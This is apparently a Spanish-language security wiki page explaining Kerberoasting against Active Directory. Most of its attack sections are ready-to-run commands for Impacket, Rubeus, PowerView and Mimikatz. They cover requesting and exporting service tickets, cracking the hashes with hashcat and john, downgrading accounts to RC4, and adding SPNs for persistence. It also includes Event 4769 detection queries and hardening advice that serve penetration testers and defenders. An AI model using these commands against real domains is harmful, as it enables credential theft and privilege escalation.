# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se centra en la adquisición de tickets TGS, específicamente aquellos relacionados con servicios que operan bajo cuentas de usuario en Active Directory (AD), excluyendo cuentas de computadora. La encriptación de estos tickets utiliza claves que provienen de las contraseñas de usuario, lo que permite el cracking de credenciales fuera de línea. El uso de una cuenta de usuario como servicio se indica mediante una propiedad ServicePrincipalName (SPN) no vacía.

Cualquier usuario autenticado del dominio puede solicitar tickets TGS, por lo que no se necesitan privilegios especiales.

### Puntos Clave

- Apunta a tickets TGS para servicios que se ejecutan bajo cuentas de usuario (es decir, cuentas con SPN configurado; no cuentas de computadora).
- Los tickets están encriptados con una clave derivada de la contraseña de la cuenta de servicio y pueden ser crackeados fuera de línea.
- No se requieren privilegios elevados; cualquier cuenta autenticada puede solicitar tickets TGS.

> [!WARNING]
> La mayoría de las herramientas públicas prefieren solicitar tickets de servicio RC4-HMAC (tipo 23) porque son más rápidos de crackear que AES. Los hashes TGS de RC4 comienzan con `$krb5tgs$23$*`, AES128 con `$krb5tgs$17$*`, y AES256 con `$krb5tgs$18$*`. Sin embargo, muchos entornos están pasando a solo AES. No asumas que solo RC4 es relevante.
> Además, evita el roasting de "spray-and-pray". El kerberoast predeterminado de Rubeus puede consultar y solicitar tickets para todos los SPNs y es ruidoso. Enumera y apunta a los principales interesantes primero.

### Ataque

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Herramientas multifuncionales que incluyen verificaciones de kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerar usuarios susceptibles a kerberoast
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Técnica 1: Solicitar TGS y volcar de la memoria
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Técnica 2: Herramientas automáticas
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Una solicitud de TGS genera el Evento de Seguridad de Windows 4769 (Se solicitó un ticket de servicio Kerberos).

### OPSEC y entornos solo AES

- Solicitar RC4 a propósito para cuentas sin AES:
- Rubeus: `/rc4opsec` utiliza tgtdeleg para enumerar cuentas sin AES y solicita tickets de servicio RC4.
- Rubeus: `/tgtdeleg` con kerberoast también activa solicitudes RC4 donde sea posible.
- Asar cuentas solo AES en lugar de fallar silenciosamente:
- Rubeus: `/aes` enumera cuentas con AES habilitado y solicita tickets de servicio AES (tipo 17/18).
- Si ya tienes un TGT (PTT o de un .kirbi), puedes usar `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` y omitir LDAP.
- Objetivos, limitación y menos ruido:
- Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` y `/jitter:<1-100>`.
- Filtra por contraseñas débiles probables usando `/pwdsetbefore:<MM-dd-yyyy>` (contraseñas más antiguas) o apunta a OUs privilegiadas con `/ou:<DN>`.

Ejemplos (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistencia / Abuso

Si controlas o puedes modificar una cuenta, puedes hacerla kerberoastable añadiendo un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Degradar una cuenta para habilitar RC4 para un cracking más fácil (requiere privilegios de escritura en el objeto objetivo):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Puedes encontrar herramientas útiles para ataques de kerberoast aquí: https://github.com/nidem/kerberoast

Si encuentras este error en Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` se debe a un desfase de tiempo local. Sincroniza con el DC:

- `ntpdate <DC_IP>` (obsoleto en algunas distribuciones)
- `rdate -n <DC_IP>`

### Detección

Kerberoasting puede ser sigiloso. Busca el Evento ID 4769 de los DCs y aplica filtros para reducir el ruido:

- Excluye el nombre del servicio `krbtgt` y los nombres de servicio que terminan con `$` (cuentas de computadora).
- Excluye solicitudes de cuentas de máquina (`*$$@*`).
- Solo solicitudes exitosas (Código de Error `0x0`).
- Rastrea tipos de cifrado: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). No alertes solo por `0x17`.

Ejemplo de triage en PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ideas adicionales:

- Establecer una línea base del uso normal de SPN por host/usuario; alertar sobre grandes picos de solicitudes de SPN distintas de un solo principal.
- Marcar el uso inusual de RC4 en dominios endurecidos con AES.

### Mitigación / Endurecimiento

- Utilizar gMSA/dMSA o cuentas de máquina para servicios. Las cuentas gestionadas tienen contraseñas aleatorias de más de 120 caracteres y rotan automáticamente, lo que hace que el cracking fuera de línea sea poco práctico.
- Hacer cumplir AES en cuentas de servicio configurando `msDS-SupportedEncryptionTypes` a solo AES (decimal 24 / hex 0x18) y luego rotar la contraseña para que las claves AES se deriven.
- Siempre que sea posible, deshabilitar RC4 en su entorno y monitorear los intentos de uso de RC4. En los DCs, puede usar el valor del registro `DefaultDomainSupportedEncTypes` para dirigir los valores predeterminados para cuentas sin `msDS-SupportedEncryptionTypes` configurado. Probar a fondo.
- Eliminar SPNs innecesarios de las cuentas de usuario.
- Utilizar contraseñas largas y aleatorias para cuentas de servicio (más de 25 caracteres) si las cuentas gestionadas no son viables; prohibir contraseñas comunes y auditar regularmente.

### Kerberoast sin una cuenta de dominio (STs solicitados por AS)

En septiembre de 2022, Charlie Clark demostró que si un principal no requiere pre-autenticación, es posible obtener un ticket de servicio a través de un KRB_AS_REQ elaborado al alterar el sname en el cuerpo de la solicitud, obteniendo efectivamente un ticket de servicio en lugar de un TGT. Esto refleja el AS-REP roasting y no requiere credenciales de dominio válidas.

Ver detalles: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Debe proporcionar una lista de usuarios porque sin credenciales válidas no puede consultar LDAP con esta técnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Relacionado

Si estás apuntando a usuarios AS-REP roastable, consulta también:

{{#ref}}
asreproast.md
{{#endref}}

## Referencias

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – La guía de Microsoft para ayudar a mitigar Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Documentación de Rubeus Roasting: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
